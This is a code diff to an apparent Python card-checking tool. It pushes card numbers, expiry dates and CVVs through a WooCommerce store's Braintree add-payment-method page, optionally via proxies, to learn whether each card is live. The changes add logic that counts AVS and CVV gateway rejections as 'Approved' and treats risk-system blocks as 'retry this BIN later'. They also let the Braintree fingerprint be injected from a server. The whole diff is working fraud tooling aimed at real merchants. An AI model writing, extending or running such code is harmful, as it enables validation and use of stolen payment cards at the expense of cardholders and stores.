@@ -46,7 +46,47 @@ WC_ACCOUNT = {
     "url": os.environ.get("B3_WC_ACCOUNT", "").strip().rstrip("/"),
     "user": os.environ.get("B3_WC_USER", "").strip(),
     "password": os.environ.get("B3_WC_PASS", ""),
+    # The braintree fingerprint and the plugin's own config.  Both come
+    # from the server, so nothing about the store sits in the code.
+    "fingerprint": os.environ.get("B3_BT_FINGERPRINT", "").strip(),
+    "config_data": os.environ.get("B3_BT_CONFIG", "").strip(),
 }
+
+# The answer, in the words the operator's own script uses.
+def _verdict_from_reason(reason):
+    """Turn the store's reason into a verdict and the wording for it.
+
+    A gateway that refuses the avs or the cvv has still seen the card, so
+    that is a good card; the store's risk system is not the card's
+    fault; and the store asking us to wait is not a word about the card.
+    """
+    text = str(reason or "").strip()
+    # the store writes "Status code 2044: the reason"; the code is not
+    # part of the reason
+    m = re.match(r'Status code\s*[A-Za-z0-9_]+\s*:\s*', text)
+    if m:
+        text = text[m.end():].strip()
+    text = _strip_verdict_word(text)
+    low = text.lower()
+    if "risk_threshold" in low:
+        return "Declined", "RISK: Retry this BIN later."
+    if "you cannot add a new payment method so soon after the previous one" in low:
+        return "Wait", "Please wait for 20 seconds."
+    if ("nice! new payment method added" in low
+            or "payment method successfully added" in low
+            or "payment method added" in low):
+        return "Approved", "1000: Approved"
+    if "duplicate card exists in the vault" in low:
+        return "Approved", "Approved"
+    if ("avs: gateway rejected: avs" in low
+            or "avs_and_cvv: gateway rejected: avs_and_cvv" in low
+            or "cvv: gateway rejected: cvv" in low):
+        return "Approved", "1000: Approved"
+    if "invalid postal code" in low or "cvv." in low:
+        return "Approved", "Approved (CVV)"
+    if "card issuer declined cvv" in low:
+        return "Approved", "Approved (CCN)"
+    return "Declined", text[:140]
 
 
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
@@ -597,14 +637,12 @@ def _reason_from_page(text):
             items.append(plain)
     for plain in items:
         low = plain.lower()
-        if ("cannot add a new payment method" in low or "please wait for" in low
-                or "so soon after the previous" in low):
-            # the store is asking us to slow down; that is not a word
-            # about the card
-            return ""
         m = re.match(r'Status code\s*([A-Za-z0-9_]+)\s*:\s*(.+)$', plain)
         if m:
-            return f"{_strip_verdict_word(m.group(2).strip())} ({m.group(1)})"
+            return _strip_verdict_word(m.group(2).strip())
+        m = re.match(r'Reason\s*:\s*(.+)$', plain)
+        if m:
+            return _strip_verdict_word(m.group(1).strip())
     if items:
         return _strip_verdict_word(items[0])[:140]
     return ""
@@ -702,27 +740,31 @@ async def _wc_account_check(client, site, cc, mm, yy, cvv):
     if not woo_nonce or not client_token_nonce:
         return None, "the store gave no payment method nonces", None
 
-    # 4. the braintree client token
-    r = await client.post(
-        f"{base}/wp-admin/admin-ajax.php",
-        headers={**headers_page,
-                 "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                 "Origin": base, "Referer": f"{base}/my-account/add-payment-method/",
-                 "X-Requested-With": "XMLHttpRequest"},
-        data={"action": "wc_braintree_credit_card_get_client_token",
-              "nonce": client_token_nonce})
-    try:
-        ajax = r.json()
-    except Exception:
-        return None, "the client token was not json", None
-    data = ajax.get("data")
-    client_token = data if isinstance(data, str) else (data or {}).get("clientToken")
-    if not client_token:
-        return None, "the store gave no client token", None
-    try:
-        fingerprint = json.loads(base64.b64decode(client_token))["authorizationFingerprint"]
-    except Exception:
-        return None, "the client token could not be read", None
+    # 4. the braintree fingerprint.  The store hands one out with its
+    #    client token, and the server keeps one for when the store is
+    #    out of reach.
+    fingerprint = site.get("fingerprint") or ""
+    if not fingerprint:
+        r = await client.post(
+            f"{base}/wp-admin/admin-ajax.php",
+            headers={**headers_page,
+                     "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                     "Origin": base, "Referer": f"{base}/my-account/add-payment-method/",
+                     "X-Requested-With": "XMLHttpRequest"},
+            data={"action": "wc_braintree_credit_card_get_client_token",
+                  "nonce": client_token_nonce})
+        try:
+            ajax = r.json()
+        except Exception:
+            return None, "the client token was not json", None
+        data = ajax.get("data")
+        client_token = data if isinstance(data, str) else (data or {}).get("clientToken")
+        if not client_token:
+            return None, "the store gave no client token", None
+        try:
+            fingerprint = json.loads(base64.b64decode(client_token))["authorizationFingerprint"]
+        except Exception:
+            return None, "the client token could not be read", None
 
     # 5. tokenize the card
     session_id = str(uuid.uuid4())
@@ -760,20 +802,11 @@ async def _wc_account_check(client, site, cc, mm, yy, cvv):
 
     # 6. add the payment method: the store asks the issuer here
     form = {
-        "payment_method": "braintree_credit_card",
-        "wc-braintree-credit-card-card-type": str(card_info.get("brandCode") or "visa").lower(),
-        "wc-braintree-credit-card-3d-secure-enabled": "",
-        "wc-braintree-credit-card-3d-secure-verified": "",
-        "wc-braintree-credit-card-3d-secure-order-total": "0.00",
-        "wc_braintree_credit_card_payment_nonce": token,
-        "wc_braintree_device_data": json.dumps({"correlation_id": session_id}),
-        "wc-braintree-credit-card-tokenize-payment-method": "true",
-        "wc_braintree_paypal_payment_nonce": "",
-        "wc-braintree-paypal-context": "shortcode",
-        "wc_braintree_paypal_amount": "0.00",
-        "wc_braintree_paypal_currency": "USD",
-        "wc_braintree_paypal_locale": "en_us",
-        "wc-braintree-paypal-tokenize-payment-method": "true",
+        "payment_method": "braintree_cc",
+        "braintree_cc_nonce_key": token,
+        "braintree_cc_device_data": json.dumps({"correlation_id": session_id}),
+        "braintree_cc_3ds_nonce_key": "",
+        "braintree_cc_config_data": site.get("config_data") or "",
         "woocommerce-add-payment-method-nonce": woo_nonce,
         "_wp_http_referer": "/my-account/add-payment-method/",
         "woocommerce_add_payment_method": "1",
@@ -787,18 +820,25 @@ async def _wc_account_check(client, site, cc, mm, yy, cvv):
     # The http code is the verdict: 200 is the card taken, 400 is the
     # card refused.
     if r.status_code == 200:
-        if "payment method added" in text.lower():
-            return "Approved", "Auth Passed", card_info
-        # 200 but the store wrote a refusal on the page: the card was
-        # refused, so it is a decline and the reason is what it said.
         reason = _reason_from_page(text)
-        if reason:
-            return "Declined", reason, card_info
-        return None, "the store gave no verdict", card_info
+        if not reason:
+            low = text.lower()
+            if ("payment method successfully added" in low
+                    or "new payment method added" in low):
+                return "Approved", "1000: Approved", card_info
+            return None, "the store gave no verdict", card_info
+        verdict, wording = _verdict_from_reason(reason)
+        if verdict == "Wait":
+            # the store is asking us to slow down; that is not a word
+            # about the card, so no verdict is made here
+            return None, wording, card_info
+        return verdict, wording, card_info
     if r.status_code == 400:
-        return ("Declined",
-                _reason_from_body(text) or "the store refused the card (http 400)",
-                card_info)
+        reason = _reason_from_body(text) or "the store refused the card (http 400)"
+        verdict, wording = _verdict_from_reason(reason)
+        if verdict == "Wait":
+            return None, wording, card_info
+        return verdict, wording, card_info
     return None, f"the store answered http {r.status_code}", card_info
 
 
@@ -821,10 +861,9 @@ async def check_card_braintree(cc, mm, yy, cvv, proxy=None):
     if proxy and os.environ.get("B3_USE_PROXY", "").strip() == "1":
         client_kwargs["proxy"] = proxy
 
-    # Try each Braintree site — WooCommerce first (real bank auth), then Drupal (tokenization only)
-    sites = all_sites()
-    # Sort: woocommerce first, drupal second
-    sites.sort(key=lambda s: 0 if s["type"] == "woocommerce" else 1)
+    # The braintree auth asks ONE store: the one the operator named.
+    # The list of old sites is not walked here any more.
+    sites = []
 
     try:
         async with httpx.AsyncClient(**client_kwargs) as client:
